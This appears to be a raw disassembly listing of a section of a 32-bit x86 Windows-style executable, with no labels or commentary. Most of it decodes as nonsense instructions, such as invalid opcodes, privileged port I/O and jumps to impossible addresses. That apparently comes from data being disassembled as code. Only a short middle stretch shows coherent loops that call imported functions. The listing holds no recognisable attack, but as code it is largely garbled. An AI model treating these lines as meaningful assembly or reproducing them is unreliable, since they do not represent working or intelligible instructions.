  40a78b:	inc    ecx
  40a78c:	pcmpgtw mm7,QWORD PTR [edx]
  40a78f:	cmp    DWORD PTR [eax+0x3ec045b4],esi
  40a795:	mov    al,0x95
  40a797:	or     al,0x93
  40a799:	(bad)  
  40a79a:	add    DWORD PTR [edi-0x33],ecx
  40a79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a79e:	mov    ds:0x67a370c7,al
  40a7a3:	iret   
  40a7a4:	mov    cl,0x96
  40a7a6:	ret    
  40a7a7:	pop    esi
  40a7a8:	in     eax,0x86
  40a7aa:	and    esi,DWORD PTR [edi-0x5a]
  40a7ad:	or     bh,BYTE PTR [esi]
  40a7af:	daa    
  40a7b0:	add    DWORD PTR [esi-0x2],ecx
  40a7b3:	add    DWORD PTR [esi],0x4af21c66
  40a7b9:	inc    ebp
  40a7ba:	fidivr DWORD PTR [ebx+0x6d]
  40a7bd:	test   BYTE PTR [eax-0x5a37a05],bl
  40a7c3:	mov    edx,0x20517912
  40a7c8:	scas   eax,DWORD PTR es:[edi]
  40a7c9:	push   ds
  40a7ca:	mov    dh,0x4f
  40a7cc:	sub    BYTE PTR [edx+0x2c],bh
  40a7cf:	mov    edi,0x54eede05
  40a7d4:	adc    DWORD PTR [edi+0x69],0xfffffff7
  40a7d8:	ins    DWORD PTR es:[edi],dx
  40a7d9:	out    0xc8,al
  40a7db:	xor    ecx,esi
  40a7dd:	xchg   BYTE PTR gs:0x88f1b3b2,bl
  40a7e4:	xchg   esp,eax
  40a7e5:	cmp    BYTE PTR [eax+0x2498ff52],cl
  40a7eb:	int3   
  40a7ec:	push   esi
  40a7ed:	push   gs
  40a7ef:	adc    edx,DWORD PTR [esi+0x26]
  40a7f2:	fwait
  40a7f3:	stc    
  40a7f4:	mov    eax,0x5df0d1cc
  40a7f9:	jo     0x40a7a6
  40a7fb:	adc    DWORD PTR fs:[ecx+edx*2],edi
  40a7ff:	ins    BYTE PTR es:[edi],dx
  40a800:	fdivrp st(4),st
  40a802:	or     al,0xbb
  40a804:	dec    edi
  40a805:	push   esp
  40a806:	ds xchg esi,eax
  40a808:	pop    es
  40a809:	jecxz  0x40a860
  40a80b:	inc    ecx
  40a80c:	sbb    DWORD PTR [ecx],esi
  40a80e:	sbb    DWORD PTR [edx],0xffffffd1
  40a811:	aad    0x66
  40a813:	xor    ebx,edx
  40a815:	stos   BYTE PTR es:[edi],al
  40a816:	xchg   DWORD PTR [ebx],esp
  40a818:	repz mov esi,esi
  40a81b:	nop
  40a81c:	adc    al,0x69
  40a81e:	push   ebx
  40a81f:	aad    0xef
  40a821:	xor    edx,DWORD PTR [edx]
  40a823:	stc    
  40a824:	(bad)  
  40a825:	fwait
  40a826:	push   ecx
  40a827:	pop    ebx
  40a828:	inc    ecx
  40a829:	and    DWORD PTR [edx+esi*2],ebp
  40a82c:	aad    0x47
  40a82e:	aad    0x43
  40a830:	mov    dh,0x7f
  40a832:	out    0xd2,al
  40a834:	jmp    0x40a7ec
  40a836:	clc    
  40a837:	inc    edx
  40a838:	cmp    BYTE PTR [esp+ebx*8+0x7d],ah
  40a83c:	pop    esp
  40a83d:	loop   0x40a82e
  40a83f:	jge    0x40a883
  40a841:	adc    bh,cl
  40a843:	mov    WORD PTR [eax+0x2e56f1c7],cs
  40a849:	fldenv [edi+0x458d9057]
  40a84f:	call   0x821ceddd
  40a854:	xor    eax,0x4302dd
  40a859:	adc    ebx,DWORD PTR [edi+0x0]
  40a85c:	add    BYTE PTR [ebx+0x2581e845],cl
  40a862:	jmp    0x40eb69
  40a867:	add    BYTE PTR [eax],al
  40a869:	add    cl,ch
  40a86b:	or     eax,0x8b000000
  40a870:	sbb    eax,0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x7af7b279],bl
  40a93e:	pop    ss
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8d0
  40a948:	mov    cs,WORD PTR [ebp-0x55]
  40a94b:	xor    eax,0xbf9b9173
  40a950:	rcr    al,1
  40a952:	jae    0x40a947
  40a954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a955:	out    0xeb,al
  40a957:	retf   0x20bf
  40a95a:	mov    es,WORD PTR [edx+0x6d]
  40a95d:	std    
  40a95e:	xchg   esi,eax
  40a95f:	mov    cl,0xe9
  40a961:	sub    ebx,esi
  40a963:	test   DWORD PTR [ecx-0x50],esi
  40a966:	imul   edx,DWORD PTR [ebx+0x2e853063],0xfda985da
  40a970:	cmp    eax,0x5387352c
  40a975:	ins    BYTE PTR es:[edi],dx
  40a976:	jbe    0x40a9dc
  40a978:	add    ch,BYTE PTR [eax-0x67]
  40a97b:	sub    ch,bl
  40a97d:	push   ebx
  40a97e:	mov    al,bl
  40a980:	and    DWORD PTR [esi],0x3cc96af3
  40a986:	pushf  
  40a987:	ja     0x40a931
  40a989:	xchg   edx,eax
  40a98a:	mov    WORD PTR ds:0xe997f029,fs
  40a990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a991:	cmc    
  40a992:	cli    
  40a993:	inc    esi
  40a994:	gs out dx,al
  40a996:	sub    dl,BYTE PTR [esi+0x3ab4ad63]
  40a99c:	loop   0x40a9bc
  40a99e:	aad    0x4
  40a9a0:	(bad)  
  40a9a1:	call   0xf4f2:0x4017abe6
  40a9a8:	push   0xb
  40a9aa:	lods   eax,DWORD PTR ds:[esi]
  40a9ab:	dec    ebx
  40a9ac:	rcl    BYTE PTR [ebx+0x30],0xa7
  40a9b0:	pop    edx
  40a9b1:	jo     0x40a96f
  40a9b3:	jns    0x40a9d6
  40a9b5:	pop    edi
  40a9b6:	dec    ebp
  40a9b7:	arpl   WORD PTR [ecx+edx*2+0x5dd88387],bx
  40a9be:	sub    esp,DWORD PTR [edx]
  40a9c0:	std    
  40a9c1:	adc    eax,0x37b47504
  40a9c6:	ds jg  0x40a998
  40a9c9:	sub    BYTE PTR [ecx+ebp*2],al
  40a9cc:	mov    ds:0x4ee55e84,eax
  40a9d1:	add    al,0xbc
  40a9d3:	fdiv   DWORD PTR [ebp+eax*8+0x23645fb0]
  40a9da:	pop    ss
  40a9db:	loope  0x40a969
  40a9dd:	pop    es
  40a9de:	inc    edx
  40a9df:	ja     0x40aa49
  40a9e1:	xchg   ah,dh
  40a9e3:	dec    ecx
  40a9e4:	or     al,0xd9
  40a9e6:	inc    ebp
  40a9e7:	jb     0x40aa66
  40a9e9:	xor    ah,BYTE PTR [edx+edi*8+0x5702ab1d]
  40a9f0:	dec    esi
  40a9f1:	loopne 0x40a989
  40a9f3:	(bad)  
  40a9f4:	and    DWORD PTR [ecx],esi
  40a9f6:	xlat   BYTE PTR ds:[ebx]
  40a9f7:	cs jecxz 0x40aa06
  40a9fa:	pushf  
  40a9fb:	mov    ds:0x813838e6,eax
  40aa00:	lds    ecx,FWORD PTR [edx-0x4c1104a]
  40aa06:	aaa    
  40aa07:	pop    esp
  40aa08:	imul   esp,DWORD PTR [eax],0xa21f2341
  40aa0e:	fild   WORD PTR [ebx]
  40aa10:	ficom  WORD PTR [edx-0x7f466c64]
  40aa16:	mov    edi,DWORD PTR [edx]
  40aa18:	mov    eax,0x771d848a
  40aa1d:	sbb    bh,dl
  40aa1f:	cmc    
  40aa20:	pop    eax
  40aa21:	lods   eax,DWORD PTR ds:[esi]
  40aa22:	pop    ebx
  40aa23:	bound  eax,QWORD PTR [esi-0x61]
  40aa26:	xchg   ebp,eax
  40aa27:	xchg   ebp,eax
  40aa28:	int    0xe7
  40aa2a:	and    eax,0x68982212
  40aa2f:	and    DWORD PTR [ebx+0x2551aab3],0x5f8b49
  40aa39:	shl    bl,cl
  40aa3b:	aas    
  40aa3c:	xor    BYTE PTR [ebx+0x7e],bl
  40aa3f:	sub    DWORD PTR [edx-0x32e48c15],0xec426404
  40aa49:	mov    ah,0x7f
  40aa4b:	xor    cl,al
  40aa4d:	je     0x40aac0
  40aa4f:	sub    eax,0xfda0bc72
  40aa54:	xor    edx,DWORD PTR [esi+0x65]
  40aa57:	es or  eax,edi
  40aa5a:	push   ss
  40aa5b:	scas   al,BYTE PTR es:[edi]
  40aa5c:	pop    eax
  40aa5d:	sahf   
  40aa5e:	mov    eax,ds:0x628e51af
  40aa63:	mov    esp,0x6b243ec5
  40aa68:	push   cs
  40aa69:	stos   BYTE PTR es:[edi],al
  40aa6a:	ror    BYTE PTR [eax+0x570aafd8],cl
  40aa70:	or     ah,dh
  40aa72:	dec    esp
  40aa73:	mov    ebp,0xa091d3a
  40aa78:	ins    DWORD PTR es:[edi],dx
  40aa79:	mov    edi,edx
  40aa7b:	ins    BYTE PTR es:[edi],dx
  40aa7c:	mov    ebx,0x81fd94f1
  40aa81:	ss jb  0x40aa1c
  40aa84:	pushf  
  40aa85:	xor    eax,0xdee8c4b4
  40aa8a:	inc    eax
  40aa8b:	nop
  40aa8c:	rol    ebx,cl
  40aa8e:	int3   
  40aa8f:	lahf   
  40aa90:	cmc    
  40aa91:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40aa93:	mov    ch,0x9f
  40aa95:	xor    eax,0x1c0036ea
  40aa9a:	and    BYTE PTR ds:0x3d9ba034,ah
  40aaa0:	loop   0x40aa34
  40aaa2:	imul   edi,DWORD PTR [edi*2-0x21431b54],0xde1e2537
  40aaad:	sub    ch,BYTE PTR [edx+0x2f]
  40aab0:	outs   dx,DWORD PTR ds:[esi]
  40aab1:	mov    cl,BYTE PTR [ebx]
  40aab3:	pop    ecx
  40aab4:	pop    esp
  40aab5:	test   BYTE PTR [edi-0x40],dl
  40aab8:	xor    BYTE PTR ds:0x366f3f89,dl
  40aabe:	aam    0x20
  40aac0:	idiv   BYTE PTR [eax-0x6b7a99f4]
  40aac6:	(bad)  
  40aac7:	ja     0x40aa5f
  40aac9:	mov    ah,BYTE PTR [ebp+0x62]
  40aacc:	stc    
  40aacd:	sbb    BYTE PTR [ebx-0x7e],ch
  40aad0:	or     bl,ah
  40aad2:	adc    eax,edi
  40aad4:	retf   0x84e9
  40aad7:	or     BYTE PTR [ecx],bh
  40aad9:	fistp  QWORD PTR [ecx+0x1d9f92b2]
  40aadf:	mov    esp,0x527c7345
  40aae4:	pusha  
  40aae5:	arpl   WORD PTR [ebx],sp
  40aae7:	aaa    
  40aae8:	cdq    
  40aae9:	cld    
  40aaea:	pop    eax
  40aaeb:	aaa    
  40aaec:	adc    eax,0xa27c0a6e
  40aaf1:	adc    dl,ah
  40aaf3:	fwait
  40aaf4:	mov    WORD PTR [ebx-0x350db7af],ds
  40aafa:	popa   
  40aafb:	mov    ch,0xcf
  40aafd:	xlat   BYTE PTR ds:[ebx]
  40aafe:	xchg   ecx,eax
  40aaff:	cwde   
  40ab00:	pop    ebx
  40ab01:	loopne 0x40ab2e
  40ab03:	inc    eax
  40ab04:	int3   
  40ab05:	sbb    DWORD PTR [edx],0x8b603c46
  40ab0b:	mov    ebp,DWORD PTR [ebp+edi*1+0x75ac33cd]
  40ab12:	sub    al,BYTE PTR [edx+0x2f]
  40ab15:	mov    BYTE PTR [edi-0x6ccfdecf],al
  40ab1b:	dec    edx
  40ab1c:	pop    ecx
  40ab1d:	je     0x40ab17
  40ab1f:	fisttp DWORD PTR [edx-0x626aafe4]
  40ab25:	fucomp st(5)
  40ab27:	sub    eax,0x70413d17
  40ab2c:	push   ebx
  40ab2d:	xor    al,0xe1
  40ab2f:	out    0x94,al
  40ab31:	int    0xea
  40ab33:	sbb    dh,BYTE PTR [esi-0x7e]
  40ab36:	push   0x7e79d5fc
  40ab3b:	daa    
  40ab3c:	setnp  bl
  40ab3f:	ins    BYTE PTR es:[edi],dx
  40ab40:	pop    ecx
  40ab41:	cmp    cl,bl
  40ab43:	ss je  0x40ab89
  40ab46:	cwde   
  40ab47:	sub    eax,0x1c24648c
  40ab4c:	or     eax,0x1c66aa7e
  40ab51:	and    cl,dh
  40ab53:	stos   BYTE PTR es:[edi],al
  40ab54:	adc    al,0x61
  40ab56:	arpl   WORD PTR [esp+eiz*4-0x22],di
  40ab5a:	mov    BYTE PTR [esi],0xd9
  40ab5d:	repz add al,BYTE PTR [eax-0x1d]
  40ab61:	sub    dl,BYTE PTR [edi+0x19]
  40ab64:	fs lahf 
  40ab66:	add    al,0xbe
  40ab68:	lods   al,BYTE PTR ds:[esi]
  40ab69:	psllq  mm4,QWORD PTR [ecx]
  40ab6c:	xor    DWORD PTR [edx],eax
  40ab6e:	rcl    DWORD PTR [edi-0x26],1
  40ab71:	and    DWORD PTR [ebp+edx*2+0xc7b35e3],esi
  40ab78:	retf   
  40ab79:	mov    ch,0x99
  40ab7b:	add    DWORD PTR [eax],esp
  40ab7d:	cmp    BYTE PTR [eax],bl
  40ab7f:	out    dx,al
  40ab80:	xor    DWORD PTR [ebx-0xb1260fc],esi
  40ab86:	jmp    0x7a8f:0x91827358
  40ab8d:	ins    BYTE PTR es:[edi],dx
  40ab8e:	and    esi,esp
  40ab90:	sbb    BYTE PTR [edx+0x46af1f56],dh
  40ab96:	mov    edi,0xa915c025
  40ab9b:	xchg   ecx,eax
  40ab9c:	cwde   
  40ab9d:	js     0x40ac03
  40ab9f:	dec    edi
  40aba0:	xchg   ebp,eax
  40aba1:	adc    eax,0x9de4dc68
  40aba6:	fwait
  40aba7:	push   esp
  40aba8:	aas    
  40aba9:	ja     0x40abe5
  40abab:	sahf   
  40abac:	adc    dl,BYTE PTR [esi+0x32447663]
  40abb2:	push   edi
  40abb3:	clc    
  40abb4:	in     eax,0xa6
  40abb6:	sar    DWORD PTR [edx+0x6bd6f341],cl
  40abbc:	dec    esp
  40abbd:	jns    0x40ac33
  40abbf:	dec    edi
  40abc0:	loopne 0x40ac38
  40abc2:	push   DWORD PTR [edi+edi*4+0x22]
  40abc6:	xor    BYTE PTR [ebx],ch
  40abc8:	rcl    BYTE PTR [esp+ebx*4],1
  40abcb:	xchg   edi,eax
  40abcc:	mov    al,ds:0xa2ea3dcd
  40abd1:	mov    ds:0x9fabf349,eax
  40abd6:	xor    BYTE PTR [edi+0x2e972ffd],ah
  40abdc:	jns    0x40ac4b
  40abde:	retf   
  40abdf:	xor    edx,ecx
  40abe1:	and    BYTE PTR [edx+0x7c],bh
  40abe4:	push   eax
  40abe5:	xchg   DWORD PTR [esi-0x3048c1d2],ebp
  40abeb:	dec    ebx
  40abec:	jl     0x40abc9
  40abee:	push   edi
  40abef:	xchg   esi,eax
  40abf0:	ret    0xab5e
  40abf3:	stos   BYTE PTR es:[edi],al
  40abf4:	and    al,0x7f
  40abf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf7:	hlt    
  40abf8:	js     0x40ac23
  40abfa:	xchg   bh,dh
  40abfc:	and    edx,DWORD PTR fs:[esp+edi*2-0x1ea00f77]
  40ac04:	gs enter 0xb73a,0xb2
  40ac09:	jge    0x40abe9
  40ac0b:	test   eax,0x929fcf82
  40ac10:	ins    DWORD PTR es:[edi],dx
  40ac11:	jae    0x40abe3
  40ac13:	imul   ebp,DWORD PTR [esi],0x6b
  40ac16:	enter  0x6130,0xaf
  40ac1a:	lahf   
  40ac1b:	cmp    eax,0x6bf5dc39
  40ac20:	mov    bl,0x73
  40ac22:	mov    bl,BYTE PTR [esi-0x49]
  40ac25:	icebp  
  40ac26:	sbb    DWORD PTR [edi+0x14],esi
  40ac29:	mov    bh,0xf6
  40ac2b:	xchg   edi,eax
  40ac2c:	js     0x40ac48
  40ac2e:	pop    edi
  40ac2f:	inc    eax
  40ac30:	call   0xff0d:0xc28ee8b5
  40ac37:	dec    esp
  40ac38:	pop    ds
  40ac39:	mov    ch,BYTE PTR [ebx+0x4e33db0a]
  40ac3f:	sub    ch,cl
  40ac41:	push   0xcc14eec1
  40ac46:	into   
  40ac47:	in     eax,dx
  40ac48:	push   esi
  40ac49:	mov    cl,0x29
  40ac4b:	cmp    al,0x7a
  40ac4d:	add    eax,0xbe9d53da
  40ac52:	cmc    
  40ac53:	imul   ebp,DWORD PTR [esi+ebx*1+0x13801a7c],0xffffffcc
  40ac5b:	fist   WORD PTR [edi-0x57a2f37]
  40ac61:	lea    eax,[edx-0x140531c]
  40ac67:	cmp    al,0x30
  40ac69:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ac6b:	push   ecx
  40ac6c:	sub    DWORD PTR [edx-0x5e],edx
  40ac6f:	test   ebp,esp
  40ac71:	adc    eax,0x3d02aa1b
  40ac76:	sbb    DWORD PTR [ecx+0x41227c],esp
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	sub    al,0x72
  40ac94:	icebp  
  40ac95:	and    eax,0x7e7eec49
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ad0b
  40ac9f:	inc    esi
  40aca0:	add    eax,0x3c950ae0
  40aca5:	inc    ebp
  40aca6:	shl    BYTE PTR [ecx-0x21],cl
  40aca9:	sub    ecx,DWORD PTR [edx+0x59086a23]
  40acaf:	loope  0x40ad2e
  40acb1:	sbb    BYTE PTR [eax-0x4a6705aa],dl
  40acb7:	fdivr  DWORD PTR [esi]
  40acb9:	add    eax,0xe93f034d
  40acbe:	push   0xe69ed592
  40acc3:	psrlw  mm3,QWORD PTR [ebp+0x40]
  40acc7:	gs jns 0x40ace6
  40acca:	lods   al,BYTE PTR ds:[esi]
  40accb:	pop    esi
  40accc:	ins    DWORD PTR es:[edi],dx
  40accd:	test   al,0xf9
  40accf:	mov    edx,0x92f2a1f2
  40acd4:	stos   DWORD PTR es:[edi],eax
  40acd5:	pop    ss
  40acd6:	push   edi
  40acd7:	test   ecx,0x1db9b43d
  40acdd:	leave  
  40acde:	inc    esi
  40acdf:	test   DWORD PTR [esi+0x50],ecx
  40ace2:	jg     0x40ac8b
  40ace4:	push   cs
  40ace5:	push   ss
  40ace6:	push   ecx
  40ace7:	sti    
  40ace8:	ins    DWORD PTR es:[edi],dx
  40ace9:	je     0x40ad53
  40aceb:	inc    esi
  40acec:	jl     0x40ad4b
  40acee:	mov    ?,WORD PTR fs:[ebx+0x1fc323cd]
  40acf5:	fwait
  40acf6:	push   esp
  40acf7:	or     bh,cl
  40acf9:	pop    ss
  40acfa:	jp     0x40ad35
  40acfc:	push   ss
  40acfd:	imul   esp,eax,0xffffffa9
  40ad00:	mov    ah,0xc6
  40ad02:	mov    eax,0xf1f9cd03
  40ad07:	ss sbb eax,0x6242400d
  40ad0d:	(bad)  
  40ad0e:	arpl   WORD PTR [edi+0x5f8a5a69],bp
  40ad14:	jmp    0x6d09:0xe31e1eff
  40ad1b:	repnz mov edx,0x421dd5bd
  40ad21:	or     edx,ecx
  40ad23:	xor    esi,esp
  40ad25:	addr16 jns 0x40ad09
  40ad28:	dec    edi
  40ad29:	sub    eax,0xe3d85bb9
  40ad2e:	push   ss
  40ad2f:	cmp    eax,esi
  40ad31:	dec    ecx
  40ad32:	je     0x40ad11
  40ad34:	xchg   al,bl
  40ad36:	out    dx,eax
  40ad37:	and    BYTE PTR [ecx+eiz*4+0x4d],bl
  40ad3b:	push   ss
  40ad3c:	pop    edi
  40ad3d:	scas   eax,DWORD PTR es:[edi]
  40ad3e:	std    
  40ad3f:	or     edx,edx
  40ad41:	data16 std 
  40ad43:	jbe    0x40ad28
  40ad45:	loopne 0x40adab
  40ad47:	jle    0x40ad95
  40ad49:	dec    ebp
  40ad4a:	cmp    al,0xbc
  40ad4c:	push   esp
  40ad4d:	test   eax,0x8bef9eb0
  40ad52:	cmp    dh,BYTE PTR [ecx+0x18]
  40ad55:	jns    0x40ad87
  40ad57:	test   ecx,ebx
  40ad59:	cwde   
  40ad5a:	xor    al,ch
  40ad5c:	in     al,dx
  40ad5d:	cs push es
  40ad5f:	push   cs
  40ad60:	xlat   BYTE PTR ds:[ebx]
  40ad61:	imul   eax,ecx,0x9569b48
  40ad67:	dec    esp
  40ad68:	push   ds
  40ad69:	js     0x40aceb
  40ad6b:	aas    
  40ad6c:	ja     0x40ad9b
  40ad6e:	lea    ecx,[esi-0xe60fce4]
  40ad74:	stos   BYTE PTR es:[edi],al
  40ad75:	adc    esi,DWORD PTR [ebp+ebp*2-0x4f995546]
  40ad7c:	xchg   ecx,eax
  40ad7d:	adc    ah,BYTE PTR [ebx]
  40ad7f:	sbb    ch,al
  40ad81:	pop    ss
  40ad82:	xor    esi,0xfffffff0
  40ad85:	jmp    0x4838fcb
  40ad8a:	leave  
  40ad8b:	(bad)  
  40ad8c:	shl    BYTE PTR [edx+0x24],1
  40ad8f:	nop
  40ad90:	call   0x2795e0c7
  40ad95:	xor    DWORD PTR [ecx+0x1f],eax
  40ad98:	mov    bh,0xf
  40ad9a:	jbe    0x40addf
  40ad9c:	xchg   esi,eax
  40ad9d:	mov    edi,0xed15a6ea
  40ada2:	inc    edi
  40ada3:	test   ch,bh
  40ada5:	push   ds
  40ada6:	iret   
  40ada7:	shr    bh,1
  40ada9:	dec    edx
  40adaa:	clc    
  40adab:	aam    0xf8
  40adad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adae:	jo     0x40adaa
  40adb0:	add    eax,0x6823e289
  40adb5:	out    0x7c,al
  40adb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adb8:	hlt    
  40adb9:	push   eax
  40adba:	ins    BYTE PTR es:[edi],dx
  40adbb:	pop    ds
  40adbc:	ss and eax,0x468508f8
  40adc2:	iret   
  40adc3:	jae    0x40ade2
  40adc5:	add    ebx,DWORD PTR [esi]
  40adc7:	add    BYTE PTR [ebx+0x32],ah
  40adca:	sahf   
  40adcb:	out    0x89,eax
  40adcd:	mov    ebp,0xd452711c
  40add2:	arpl   WORD PTR [ecx-0x106052b],di
  40add8:	cs sti 
  40adda:	dec    ebp
  40addb:	pushf  
  40addc:	addr16 stc 
  40adde:	aaa    
  40addf:	mov    ah,BYTE PTR [eax]
  40ade1:	sub    esp,DWORD PTR [esi+ebx*4+0x28]
  40ade5:	clc    
  40ade6:	sub    eax,0xec3a0bb
  40adeb:	push   edi
  40adec:	and    esp,DWORD PTR [edx]
  40adee:	in     al,dx
  40adef:	jmp    0x40ad8a
  40adf1:	sub    BYTE PTR [esi-0x5c],bh
  40adf4:	leave  
  40adf5:	push   ecx
  40adf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf7:	jp     0x40ad89
  40adf9:	xor    si,di
  40adfc:	mov    BYTE PTR [ebp+0x5c9a8542],cl
  40ae02:	into   
  40ae03:	lahf   
  40ae04:	xor    ebp,esp
  40ae06:	mov    edi,0xaae52163
  40ae0b:	push   esp
  40ae0c:	sbb    al,cl
  40ae0e:	xchg   esi,eax
  40ae0f:	add    DWORD PTR [eax-0x39],0x54
  40ae13:	shl    ebp,0x1d
  40ae16:	rcl    ecx,1
  40ae18:	enter  0xe071,0x53
  40ae1c:	mov    ds:0x4f8b5209,eax
  40ae21:	aas    
  40ae22:	dec    ebp
  40ae23:	nop
  40ae24:	cmp    eax,0xf016868b
  40ae29:	pusha  
  40ae2a:	cmp    DWORD PTR [edx-0x50],ecx
  40ae2d:	js     0x40ae19
  40ae2f:	inc    esi
  40ae30:	bound  ebx,QWORD PTR [esp+esi*2+0x33]
  40ae34:	jmp    FWORD PTR [ecx+0x31]
  40ae37:	out    0xcf,eax
  40ae39:	adc    DWORD PTR [edi+0x8],ebx
  40ae3c:	es xchg esp,eax
  40ae3e:	sub    edx,DWORD PTR [ebp-0x781427ae]
  40ae44:	jge    0x40addc
  40ae46:	pusha  
  40ae47:	dec    ebx
  40ae48:	es (bad) 
  40ae4a:	and    DWORD PTR [edx+0x5dd7317f],eax
  40ae50:	ja     0x40ae4e
  40ae52:	push   edx
  40ae53:	dec    esi
  40ae54:	int3   
  40ae55:	je     0x40ae84
  40ae57:	aam    0x8f
  40ae59:	and    BYTE PTR [ecx+0x4dd8a7a5],bh
  40ae5f:	out    dx,eax
  40ae60:	mov    dl,0x49
  40ae62:	int3   
  40ae63:	hlt    
  40ae64:	pop    esp
  40ae65:	sti    
  40ae66:	jmp    0xf369:0xe38548b4
  40ae6d:	iret   
  40ae6e:	test   BYTE PTR [ebp+esi*2+0x65a7e767],al
  40ae75:	pop    ss
  40ae76:	jb     0x40ae22
  40ae78:	sub    eax,0xe0e9f04e
  40ae7d:	les    esi,FWORD PTR [ecx+eiz*8]
  40ae80:	dec    ebx
  40ae81:	mov    esp,0x9bef9fa4
  40ae86:	inc    edi
  40ae87:	imul   ecx,DWORD PTR [ecx-0x25f11c2],0x5
  40ae8e:	jnp    0x40ae8f
  40ae90:	faddp  st(0),st
  40ae92:	mov    cl,0x3d
  40ae94:	xor    bl,0x50
  40ae97:	pop    esi
  40ae98:	dec    eax
  40ae99:	dec    esp
  40ae9a:	and    ecx,ecx
  40ae9c:	fwait
  40ae9d:	sub    ah,BYTE PTR [ecx-0x1d]
  40aea0:	push   eax
  40aea1:	mov    ah,0xde
  40aea3:	xchg   BYTE PTR [esp+edx*1-0x26],al
  40aea7:	jp     0x40aee8
  40aea9:	stos   DWORD PTR es:[edi],eax
  40aeaa:	les    esi,FWORD PTR [eax+edi*2+0x5a]
  40aeae:	movzx  edx,BYTE PTR [eax+ebp*1+0x7fdc0597]
  40aeb6:	daa    
  40aeb7:	xchg   esp,eax
  40aeb8:	dec    esi
  40aeb9:	iret   
  40aeba:	mov    cl,BYTE PTR [ebx+0x33]
  40aebd:	scas   eax,DWORD PTR es:[edi]
  40aebe:	call   0x4915dafd
  40aec3:	xchg   ebp,eax
  40aec4:	leave  
  40aec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec6:	rsm    
  40aec8:	scas   eax,DWORD PTR es:[edi]
  40aec9:	sbb    ebx,edi
  40aecb:	and    ebp,DWORD PTR [edi-0x7f]
  40aece:	sub    BYTE PTR [edx],al
  40aed0:	fs dec edi
  40aed2:	push   ebx
  40aed3:	xor    esp,eax
  40aed5:	ja     0x40af06
  40aed7:	add    BYTE PTR [ebx],ah
  40aed9:	dec    ebx
  40aeda:	mov    esi,0x4b7383ea
  40aedf:	mov    esi,0xbf814386
  40aee4:	or     eax,0xe7048a8
  40aee9:	adc    eax,0xa7a08fc9
  40aeee:	into   
  40aeef:	dec    cl
  40aef1:	in     al,0xd1
  40aef3:	aaa    
  40aef4:	mov    ds:0xf0cb749d,eax
  40aef9:	imul   ebx,DWORD PTR [ecx],0x559129fc
  40aeff:	(bad)  
  40af00:	and    al,ch
  40af02:	into   
  40af03:	shl    DWORD PTR [edx+0x6],cl
  40af06:	and    cl,bl
  40af08:	xchg   ebx,eax
  40af09:	sub    ch,BYTE PTR [esi+0x57e2fdb3]
  40af0f:	mov    edi,cs
  40af11:	mov    ss,WORD PTR [ecx-0x6b32e697]
  40af17:	pop    ecx
  40af18:	repz retf 
  40af1a:	xor    esp,DWORD PTR [ebx*8-0x19afa64f]
  40af21:	adc    eax,0x79e662b2
  40af26:	loopne 0x40af2b
  40af28:	inc    esp
  40af29:	lods   al,BYTE PTR ds:[esi]
  40af2a:	aaa    
  40af2b:	cmp    BYTE PTR [ecx],bh
  40af2d:	or     eax,0xf9ac5c42
  40af32:	clc    
  40af33:	sahf   
  40af34:	lahf   
  40af35:	push   ecx
  40af36:	ret    0x2006
  40af39:	mov    esi,0xad12aee9
  40af3e:	fs ffreep st(6)
  40af41:	out    0x7b,eax
  40af43:	mov    bh,0x67
  40af45:	xchg   DWORD PTR [ebp-0x5cf5ee39],edi
  40af4b:	out    0xdf,al
  40af4d:	lods   eax,DWORD PTR ds:[esi]
  40af4e:	jmp    FWORD PTR [edi-0x31]
  40af51:	or     eax,0x2e8d47d4
  40af56:	sub    esi,DWORD PTR [eax]
  40af58:	mov    al,0xa7
